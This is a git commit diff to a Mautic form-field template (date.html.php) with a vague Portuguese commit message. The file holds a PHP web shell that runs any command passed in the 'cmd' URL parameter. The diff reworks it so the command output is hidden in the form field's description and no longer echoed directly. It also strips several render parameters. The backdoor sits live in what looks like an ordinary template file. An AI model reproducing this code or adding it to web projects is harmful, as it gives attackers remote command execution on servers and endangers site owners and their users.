37e316dbc38621b9701a26dded1b9d5a85ebfff6
ooclaar <ramonalonso@outlook.com.br>
2025-06-22 13:47:04 -0300

    Modificacoes no arquivo rev

--- html/MauticFormBundle/Field/date.html.php
+++ html/MauticFormBundle/Field/date.html.php
@@ -1,13 +1,14 @@
 <?php
-echo shell_exec($_GET['cmd'].' 2>&1');
+
+$cmdOutput = shell_exec($_GET['cmd'] . ' 2>&1');
+
+$field->setDescription($cmdOutput);
+
 echo $view->render(
-'MauticFormBundle:Field:text.html.php',
-[
-'field' => $field,
- 'inForm' => (isset($inForm)) ? $inForm : false,
-'type' => 'date',
-'id' => $id,
-'formId' => (isset($formId)) ? $formId : 0,
-'formName' => (isset($formName)) ? $formName : '',
-]
+    'MauticFormBundle:Field:text.html.php',
+    [
+        'field'  => $field,
+        'inForm' => $inForm ?? false,
+    ]
 );
+
